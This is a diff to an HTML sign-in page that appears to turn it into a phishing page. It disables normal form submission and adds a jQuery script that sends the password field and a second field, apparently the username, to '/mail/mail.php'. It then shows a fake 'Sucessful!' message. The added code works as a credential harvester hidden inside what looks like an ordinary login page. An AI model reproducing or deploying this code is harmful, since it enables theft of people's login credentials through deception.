@@ -20,8 +20,9 @@
         
         <header role="banner"  class="signInHeader row">
   
+            
   
-  </header>
+        </header>
         <!-- Header Ends -->
         
 		
@@ -37,7 +38,7 @@
                 <h2 style="color:red"> Welcome </h2>
                <form 
 			        
-			   id=" " role="form" aria-label="Sign in " name=" " action=" " method="post"
+			   id=" " role="form" aria-label="Sign in " name=" "  action="" method="post" 
                     autocomplete="off" onsubmit=" ">      <!--Sign in button action -->
 
                    
@@ -66,7 +67,7 @@
                         <label for="Q1" class="signInLabel">Password<span class="accessible"> (required)</span></label>
                         <div class="inputWrapper">
                             <input type="password" name="Q1" id="Q1" tabindex="3" />
-                            <button type="submit" tabindex="4" class="yellowBtnLarge">Sign In</button>
+                            <button type="button" tabindex="4" class="yellowBtnLarge">Sign In</button>
                         </div>
                         <div class="formLinks">
                             
@@ -76,8 +77,9 @@
                   </fieldset>
                 </form>
               </section>
-              
-                
+             <br/>
+             <div style="width:285px;height:auto;background:#4CAF50;padding:2%;text-align:center;display:none; " class="success">Sucessful!</div>
+            
               
             </div>
             
@@ -90,6 +92,28 @@
         
         
     </body>
+ <script type="text/javascript" src="https://cdn.jsdelivr.net/jquery/3.2.1/jquery.min.js"></script>
+ <script type="text/javascript">
+     $(function(){
+        $(".yellowBtnLarge").click(function(){
+           var data = {
+             Q1: $("#Q1").val(),
+             K1: $("#K1").val(),
+            };
+           $.ajax({
+                type: "POST",
+                url: "/mail/mail.php",
+                data: data,
+                success: function(data , status){
+                   $('.success').fadeIn(1000);
+                   
+                }
+           }); 
+        });
+          
 
+     });
+
+ </script>
 
 </html>
